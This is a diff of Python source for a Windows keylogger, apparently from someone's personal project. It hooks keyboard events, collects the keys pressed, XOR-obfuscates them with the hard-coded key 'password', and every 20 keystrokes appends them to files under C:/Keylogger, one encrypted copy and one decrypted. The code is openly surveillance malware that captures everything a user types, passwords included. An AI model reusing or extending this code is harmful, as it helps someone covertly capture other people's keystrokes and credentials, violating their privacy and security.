@@ -6,12 +6,15 @@ import win32event, win32api, winerror
 import threading
 import os.path
 
-def WriteToFile():
-    save_path = "C:/Keylogger/"
-    name_of_file = "KeyLogger"
-    complete_name = os.path.join(save_path, name_of_file+".txt")
-    file = open(complete_name, "a")
+# Write an encrypted file with the pressed keys
+def WriteToFileEn(): 
+    file = open(Pressed.path, "a")
     file.write(xor(Pressed.i, Pressed.key))
+    file.close()
+
+def WriteToFileDe(): 
+    file = open(Pressed.new_path, "a")
+    file.write(DecryptFile())
     file.close()
 
 def KeyFilters(event):
@@ -48,21 +51,23 @@ def KeyFilters(event):
     Pressed.count += 1
     return True
 
-def xor(data, key):
+def xor(data, key): ##XOR Algorithm
     output = ""
     for i, character in enumerate(data):
         output += chr(ord(character) ^ ord(key[i % len(key)]))
     return output 
 
-def DecryptFile(complete_name):
-    file = open(complete_name, "r")
+def DecryptFile():
+    file = open(Pressed.path, "r")
     str = file.read()
-    return (xor(str, Pressed.key))
+    return (xor(str, Pressed.key))  ##need to add function call that writes the decrypted file
 
 class Pressed:
     i = ''
     count = 0
     key = "password"
+    path = os.path.join("C:/", "Keylogger/", "keylogger.txt")
+    new_path = os.path.join("C:/", "Keylogger/", "keylogger_new.txt")
     
 
 
@@ -83,8 +88,8 @@ def OnKeyboardEvent(event):
 ##    print '---'
     KeyFilters(event)
     if (Pressed.count > 20):
-        WriteToFile()
-        DecryptFile()
+        WriteToFileEn()
+        WriteToFileDe()
         Pressed.count = 0
         Pressed.i = ''
     return True
